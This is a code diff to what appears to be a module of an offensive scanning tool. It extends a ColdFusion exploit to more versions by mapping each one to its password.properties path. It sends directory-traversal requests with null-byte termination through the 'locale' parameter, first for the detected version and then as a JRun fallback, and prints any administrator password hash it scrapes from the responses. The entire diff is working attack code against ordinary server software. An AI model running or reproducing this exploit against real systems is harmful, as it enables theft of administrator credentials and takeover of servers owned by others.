@@ -38,11 +38,17 @@ class Auxiliary:
                        '/CFIDE/administrator/entman/index.cfm',
                       ]
 
+        ver_dir = { "6.0" : "CFusionMX\lib\password.properties",
+                    "7.0" : "CFusionMX7\lib\password.properties",
+                    "8.0" : "ColdFusion8\lib\password.properties",
+                    "JRun" : "JRun4\servers\cfusion\cfusion-ear\cfusion-war"\
+                             "\WEB-INF\cfusion\lib\password.properties"
+                  }
+
         base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
         for path in directories:
 
-            uri = "{0}?locale={1}ColdFusion8"\
-                  "\lib\password.properties%00en"
+            uri = "{0}?locale={1}" + ver_dir[fingerprint.version] + "%00en"
             for dots in range(7,12):
 
                 if fingerengine.options.remote_os == 'linux':
@@ -57,6 +63,23 @@ class Auxiliary:
                     if len(pw_hash) > 0:
                         utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                         return
+
+        utility.Msg("Hash not found, attempting JRun..")
+        uri = "{0}?locale={1}" + ver_dir["JRun"] + "%00en"
+        for dots in range(7, 12):
+
+            if fingerengine.options.remote_os == 'linux':
+                t_url = uri.format(path, "../" * dots)
+            else:
+                t_url = uri.format(path, "..\\" * dots)
+
+            response = utility.requests_get(base + t_url)
+            if response.status_code == 200:
+
+                pw_hash = re.findall("password=(.*?)\r\n", response.content)
+                if len(pw_hash) > 0:
+                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
+                    return
 
     def run_latter(self, fingerengine, fingerprint):
         """ There's a slightly different way of doing this for 9/10, so we do that here
